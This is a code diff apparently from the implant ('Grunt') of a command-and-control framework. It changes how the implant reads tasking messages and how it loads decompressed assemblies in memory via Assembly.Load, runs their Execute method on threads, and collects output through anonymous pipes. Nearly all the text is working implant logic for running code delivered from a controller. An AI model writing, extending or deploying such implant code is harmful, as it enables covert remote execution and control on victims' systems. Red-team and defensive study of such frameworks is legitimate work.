@@ -82,11 +82,7 @@ namespace BruteExecutor
                     try
                     {
                         GruntTaskingMessage message = messenger.ReadTaskingMessage();
-                        if (message == null)
-                        {
-                            ConnectAttemptCount++;
-                        }
-                        else
+                        if (message != null)
                         {
                             ConnectAttemptCount = 0;
                             string output = "";
@@ -223,13 +219,13 @@ namespace BruteExecutor
                         Assembly gruntTask = Assembly.Load(decompressedBytes);
                         PropertyInfo streamProp = gruntTask.GetType("Task").GetProperty("OutputStream");
                         string results = "";
-                        Thread invokeThread = new Thread(() => results = (string) gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters));
                         if (streamProp == null)
                         {
-                            invokeThread.Start();
+                            results = (string) gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters);
                         }
                         else
                         {
+                            Thread invokeThread = new Thread(() => results = (string) gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters));
                             using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
                             {
                                 using (AnonymousPipeClientStream pipeClient = new AnonymousPipeClientStream(PipeDirection.Out, pipeServer.GetClientHandleAsString()))
@@ -269,8 +265,8 @@ namespace BruteExecutor
                                     }
                                 }
                             }
+                            invokeThread.Join();
                         }
-                        invokeThread.Join();
                         output += results;
                     }
                 }
